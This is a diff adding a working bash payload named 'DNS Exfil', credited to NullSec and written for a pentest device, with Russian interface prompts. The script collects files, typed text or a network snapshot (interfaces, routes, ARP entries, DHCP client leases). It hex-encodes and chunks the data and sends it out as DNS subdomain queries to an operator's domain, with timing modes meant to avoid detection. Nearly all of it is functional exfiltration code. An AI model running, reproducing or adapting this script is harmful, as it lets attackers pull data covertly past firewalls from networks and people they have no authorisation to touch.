@@ -1,0 +1,215 @@
+#!/bin/bash
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+# Title: DNS Exfil
+# Author: NullSec
+# Description: Data exfiltration via DNS tunneling queries
+# Category: nullsec/exfiltration
+
+# FIX: UI PATH and fallbacks
+export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
+command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
+command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
+command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
+command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
+command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
+command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
+command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
+command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }
+
+LOOT_DIR="/mmc/nullsec/dnsexfil"
+mkdir -p "$LOOT_DIR"
+
+PROMPT "DNS EXFIL
+
+Экфильтрация данных через DNS
+запросы туннелирования. Кодирует
+данные в поддоменные запросы,
+проходящие мимо большинства
+брандмауэров.
+
+Функции:
+- Base32/hex кодирование
+- Разбиение на чанки
+- Настраиваемый DNS сервер
+- Управление задержкой для стелса
+- Поддержка TXT/CNAME/A
+
+Нажмите OK для настройки."
+
+# Check for required tools
+if ! command -v nslookup >/dev/null 2>&1 && ! command -v dig >/dev/null 2>&1; then
+    ERROR_DIALOG "Отсутствуют DNS утилиты!
+
+Установите bind-tools:
+opkg update && opkg install bind-dig"
+    exit 1
+fi
+
+DNS_TOOL="nslookup"
+command -v dig >/dev/null 2>&1 && DNS_TOOL="dig"
+LOG "Используем DNS утилиту: $DNS_TOOL"
+
+DNS_SERVER=$(TEXT_PICKER "IP DNS сервера:" "8.8.8.8")
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DNS_SERVER="8.8.8.8" ;; esac
+
+DOMAIN=$(TEXT_PICKER "Домен туннеля:" "t.example.com")
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DOMAIN="t.example.com" ;; esac
+
+[ "$DOMAIN" = "t.example.com" ] && { ERROR_DIALOG "Настройте реальный домен!
+
+Вам нужен домен с NS-записями,
+указанными на ваш сервер приёма."; exit 1; }
+
+PROMPT "ИСТОЧНИК ДАННЫХ:
+
+1. Файл из loot каталога
+2. Свой путь к файлу
+3. Ввод текста
+4. Снимок системной информации
+
+Выберите источник."
+
+DATA_SRC=$(NUMBER_PICKER "Источник (1-4):" 4)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DATA_SRC=4 ;; esac
+[ "$DATA_SRC" -lt 1 ] && DATA_SRC=1
+[ "$DATA_SRC" -gt 4 ] && DATA_SRC=4
+
+DATA_FILE="/tmp/dnsexfil_data_$$.txt"
+
+case $DATA_SRC in
+    1) # Loot directory file
+        SRC_FILE=$(TEXT_PICKER "Файл из loot:" "/mmc/nullsec/datavacuum/latest.txt")
+        [ ! -f "$SRC_FILE" ] && { ERROR_DIALOG "Файл не найден:
+$SRC_FILE"; exit 1; }
+        cp "$SRC_FILE" "$DATA_FILE"
+        ;;
+    2) # Custom path
+        SRC_FILE=$(TEXT_PICKER "Путь к файлу:" "/tmp/data.txt")
+        [ ! -f "$SRC_FILE" ] && { ERROR_DIALOG "Файл не найден:
+$SRC_FILE"; exit 1; }
+        cp "$SRC_FILE" "$DATA_FILE"
+        ;;
+    3) # Text input
+        TEXT_DATA=$(TEXT_PICKER "Данные для эксфильтрации:" "")
+        [ -z "$TEXT_DATA" ] && { ERROR_DIALOG "Нет данных!"; exit 1; }
+        echo "$TEXT_DATA" > "$DATA_FILE"
+        ;;
+    4) # System info
+        {
+            echo "=== NULLSEC DNS EXFIL ==="
+            echo "Hostname: $(cat /proc/sys/kernel/hostname)"
+            echo "Date: $(date)"
+            echo "Uptime: $(uptime)"
+            echo "Интерфейсы:"
+            ip -4 addr show | grep -E 'inet |^[0-9]'
+            echo "Routes:"
+            ip route
+            echo "ARP:"
+            arp -a 2>/dev/null || cat /proc/net/arp
+            echo "Clients:"
+            cat /tmp/dhcp.leases 2>/dev/null
+        } > "$DATA_FILE"
+        ;;
+esac
+
+DATA_SIZE=$(wc -c < "$DATA_FILE" | tr -d ' ')
+LOG "Данные для эксфильтрации: $DATA_SIZE байт"
+
+PROMPT "РЕЖИМ ТАЙМИНГА:
+
+1. Быстро (задержка 50мс)
+2. Нормально (200мс)
+3. Стелс (1-3с случайно)
+4. Очень стелс (5-15с)
+
+Медленнее = менее заметно
+Выберите режим."
+
+TIMING=$(NUMBER_PICKER "Тайминг (1-4):" 2)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMING=2 ;; esac
+
+case $TIMING in
+    1) MIN_DELAY=0.05; MAX_DELAY=0.05 ;;
+    2) MIN_DELAY=0.2;  MAX_DELAY=0.2  ;;
+    3) MIN_DELAY=1;    MAX_DELAY=3    ;;
+    4) MIN_DELAY=5;    MAX_DELAY=15   ;;
+esac
+
+# Estimate time
+CHUNK_SIZE=30
+TOTAL_CHUNKS=$(( (DATA_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
+EST_TIME=$(echo "$TOTAL_CHUNKS $MIN_DELAY" | awk '{printf "%.0f", $1 * $2}')
+
+resp=$(CONFIRMATION_DIALOG "НАЧАТЬ DNS ЭКСФИЛЬТРАЦИЮ?
+
+Домен: $DOMAIN
+Сервер: $DNS_SERVER
+Данные: $DATA_SIZE байт
+Чанки: $TOTAL_CHUNKS
+Примерно: ~${EST_TIME}s
+Режим: $TIMING
+
+Нажмите OK чтобы начать.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f "$DATA_FILE"; exit 0; }
+
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+EXFIL_LOG="$LOOT_DIR/exfil_$TIMESTAMP.log"
+
+LOG "DNS эксфильтрация начата на $DOMAIN"
+SPINNER_START "Exfiltrating via DNS..."
+
+# Encode data to hex and chunk it
+HEX_DATA=$(xxd -p "$DATA_FILE" | tr -d '\n')
+HEX_LEN=${#HEX_DATA}
+SENT=0
+SEQ=0
+ERRORS=0
+
+while [ $SENT -lt $HEX_LEN ]; do
+    CHUNK="${HEX_DATA:$SENT:$((CHUNK_SIZE * 2))}"
+    QUERY="${SEQ}.${CHUNK}.${DOMAIN}"
+
+    if [ "$DNS_TOOL" = "dig" ]; then
+        RESULT=$(dig +short +tries=1 +time=2 "$QUERY" @"$DNS_SERVER" A 2>/dev/null)
+    else
+        RESULT=$(nslookup "$QUERY" "$DNS_SERVER" 2>/dev/null)
+    fi
+
+    if [ $? -ne 0 ]; then
+        ERRORS=$((ERRORS + 1))
+        echo "[$SEQ] FAIL: $QUERY" >> "$EXFIL_LOG"
+    else
+        echo "[$SEQ] OK: ${CHUNK:0:16}..." >> "$EXFIL_LOG"
+    fi
+
+    SEQ=$((SEQ + 1))
+    SENT=$((SENT + CHUNK_SIZE * 2))
+
+    # Delay
+    if [ "$MIN_DELAY" = "$MAX_DELAY" ]; then
+        sleep "$MIN_DELAY"
+    else
+        RAND_DELAY=$(awk -v min="$MIN_DELAY" -v max="$MAX_DELAY" 'BEGIN{srand(); printf "%.1f", min + rand() * (max - min)}')
+        sleep "$RAND_DELAY"
+    fi
+done
+
+SPINNER_STOP
+
+rm -f "$DATA_FILE"
+
+LOG "DNS эксфильтрация завершена: $SEQ чанков, $ERRORS ошибок"
+
+PROMPT "DNS ЭКСФИЛЬТРАЦИЯ ЗАВЕРШЕНА
+
+Отправлено чанков: $SEQ
+Ошибок: $ERRORS
+Размер данных: $DATA_SIZE байт
+Домен: $DOMAIN
+
+Лог: $EXFIL_LOG
+
+Соберите заново на сервере
+с помощью DNS exfil receiver."
+
+exit 0
